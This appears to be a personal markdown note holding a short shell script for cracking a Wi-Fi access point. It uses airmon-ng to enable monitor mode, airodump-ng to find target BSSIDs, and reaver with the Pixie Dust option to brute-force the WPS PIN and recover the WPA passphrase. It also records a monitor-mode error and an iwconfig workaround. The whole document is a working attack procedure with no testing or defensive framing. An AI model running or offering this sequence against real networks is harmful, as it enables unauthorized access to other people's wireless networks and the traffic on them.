# General Algo

```sh
# kill all interfering processes
airmon-ng check kill

# get wireless interface
wireless_interface="$(airmon-ng | grep phy0 | awk '{print $2}')"

# start airmon-ng on the wireless interface
airmon-ng start "$wireless_interface"

# start airodump-ng on the wireless interface
# need to get BSSID from this for the AP you're trying to crack (or all of them and iterate)
# ERROR:
#    ioctl(SIOCSIWMODE) failed: Not supported
#    ioctl(SIOCSIWMODE) failed: Not supported
#    Error setting monitor mode on wlp2s0
#    Failed initializing wireless card(s): wlp2s0
# ---
# Possibly due to this old ass MacBook.
# ---
# Workaround for other cards (?):
# ifconfig "$wireless_interface" down
# iwconfig "$wireless_interface" mode monitor
# ifconfig "$wireless_interface" up

airodump-ng "$wireless_interface"

# run reaver to brute force the WPS pin
#  | grep "WPS PIN:"
#  | grep "WPA PSK:"
#  | grep "AP SSID:"
reaver -i "$wireless_interface" -b $BSSID_TO_ATTACK -vv -K 1
```
